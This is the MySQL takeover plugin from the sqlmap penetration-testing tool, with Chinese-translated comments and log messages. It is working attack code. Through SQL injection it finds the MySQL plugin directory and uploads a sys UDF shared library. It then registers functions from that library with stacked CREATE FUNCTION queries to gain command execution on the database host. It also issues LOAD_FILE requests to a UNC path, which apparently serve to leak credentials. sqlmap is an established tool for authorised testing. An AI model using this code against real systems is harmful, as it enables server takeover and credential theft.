#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import decloakToTemp
from lib.core.common import isStackingAvailable
from lib.core.common import isWindowsDriveLetterPath
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import unArrayizeValue
from lib.core.compat import LooseVersion
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import OS
from lib.request import inject
from lib.request.connect import Connect as Request
from plugins.generic.takeover import Takeover as GenericTakeover

class Takeover(GenericTakeover):
    def __init__(self):
        self.__basedir = None
        self.__datadir = None
        self.__plugindir = None

        GenericTakeover.__init__(self)

    def udfSetRemotePath(self):
        self.getVersionFromBanner()

        banVer = kb.bannerFp["dbmsVersion"]

        if banVer and LooseVersion(banVer) >= LooseVersion("5.0.67"):
            if self.__plugindir is None:
                logger.info('检索 MySQL 插件目录绝对路径')
                self.__plugindir = unArrayizeValue(inject.getValue("SELECT @@plugin_dir"))

            # 在 MySQL 5.1 >= 5.1.19 以及任何版本的 MySQL 6.0 上
            if self.__plugindir is None and LooseVersion(banVer) >= LooseVersion("5.1.19"):
                logger.info('检索 MySQL 基目录绝对路径')

                # 参考号：http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
                self.__basedir = unArrayizeValue(inject.getValue("SELECT @@basedir"))

                if isWindowsDriveLetterPath(self.__basedir or ""):
                    Backend.setOs(OS.WINDOWS)
                else:
                    Backend.setOs(OS.LINUX)

                # DLL 必须位于 C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin 中
                if Backend.isOs(OS.WINDOWS):
                    self.__plugindir = "%s/lib/plugin" % self.__basedir
                else:
                    self.__plugindir = "%s/lib/mysql/plugin" % self.__basedir

            self.__plugindir = ntToPosixSlashes(normalizePath(self.__plugindir)) or '.'

            self.udfRemoteFile = "%s/%s.%s" % (self.__plugindir, self.udfSharedLibName, self.udfSharedLibExt)

        # 在 MySQL 4.1 < 4.1.25 和 MySQL 4.1 >= 4.1.25 上，在 my.ini 配置文件中未设置plugin_dir
        # 在 MySQL 5.0 < 5.0.67 和 MySQL 5.0 >= 5.0.67 上，在 my.ini 配置文件中未设置plugin_dir
        else:
            # logger.debug("检索MySQL数据目录绝对路径")

            # 参考号：http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
            # self.__datadir = Inject.getValue("SELECT @@datadir")

            # 注意：将相对路径指定为“./udf.dll”
            # 在 MySQL 4.1 和 MySQL 5.0 上都保存在 @@datadir 中
            self.__datadir = '.'
            self.__datadir = ntToPosixSlashes(normalizePath(self.__datadir))

            # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
            # C:\WINDOWS\system32, @@basedir\bin or @@datadir
            self.udfRemoteFile = "%s/%s.%s" % (self.__datadir, self.udfSharedLibName, self.udfSharedLibExt)

    def udfSetLocalPaths(self):
        self.udfLocalFile = paths.SQLMAP_UDF_PATH
        self.udfSharedLibName = "libs%s" % randomStr(lowercase=True)

        if Backend.isOs(OS.WINDOWS):
            _ = os.path.join(self.udfLocalFile, "mysql", "windows", "%d" % Backend.getArch(), "lib_mysqludf_sys.dll_")
            self.udfLocalFile = decloakToTemp(_)
            self.udfSharedLibExt = "dll"
        else:
            _ = os.path.join(self.udfLocalFile, "mysql", "linux", "%d" % Backend.getArch(), "lib_mysqludf_sys.so_")
            self.udfLocalFile = decloakToTemp(_)
            self.udfSharedLibExt = "so"

    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            logger.info('从二进制 UDF 文件创建 UDF“%s”' % udf)

            ret = inpRet["return"]

            # 参考号：http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html
            inject.goStacked("DROP FUNCTION %s" % udf)
            inject.goStacked("CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" % (udf, ret, self.udfSharedLibName, self.udfSharedLibExt))

            self.createdUdf.add(udf)
        else:
            logger.debug('根据要求保留现有 UDF“%s”' % udf)

    def uncPathRequest(self):
        if not isStackingAvailable():
            query = agent.prefixQuery("AND LOAD_FILE('%s')" % self.uncPath)
            query = agent.suffixQuery(query)
            payload = agent.payload(newValue=query)

            Request.queryPage(payload)
        else:
            inject.goStacked("SELECT LOAD_FILE('%s')" % self.uncPath, silent=True)
